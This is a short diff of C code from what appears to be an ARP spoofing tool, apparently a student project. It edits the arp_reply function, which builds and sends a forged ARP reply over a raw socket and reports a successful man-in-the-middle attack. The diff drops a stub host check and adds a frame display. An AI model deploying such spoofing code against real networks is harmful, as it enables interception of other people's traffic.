@@ -39,22 +39,13 @@ uint8_t hex_simple(char *s){
 }
 
 
-int check_up_target(char *s){
-(void)s;
-	return (0);
-}
-
 int arp_reply(char **av){
 	int sock, bytes, frame_length;
 	arp_hdr arphdr;
 	struct sockaddr_ll device;
 	unsigned char ether_frame[60];
 
-	printf("Initialization of the ARP reply\nCheck if the target IP (%s) is up, please wait ...\n", av[3]);
-	if (check_up_target(av[3]) != 0){
-		printf("Unknown host IP: %s\n", av[3]);
-		return (-1);
-	}
+	printf("Initialization of the ARP reply ...");
 	sleep(1);
 	fill_arphdr(&arphdr, av);
 	fill_device(&device, arphdr.sender_mac);
@@ -76,6 +67,7 @@ int arp_reply(char **av){
 		return (-1);
 	}
 	close(sock);
-	printf("Man In The Middle Attack Succeeded\nProgram Exiting\n");
+	display(ether_frame);
+	printf("Man In The Middle Attack Succeeded\n");
 	return (0);
 }
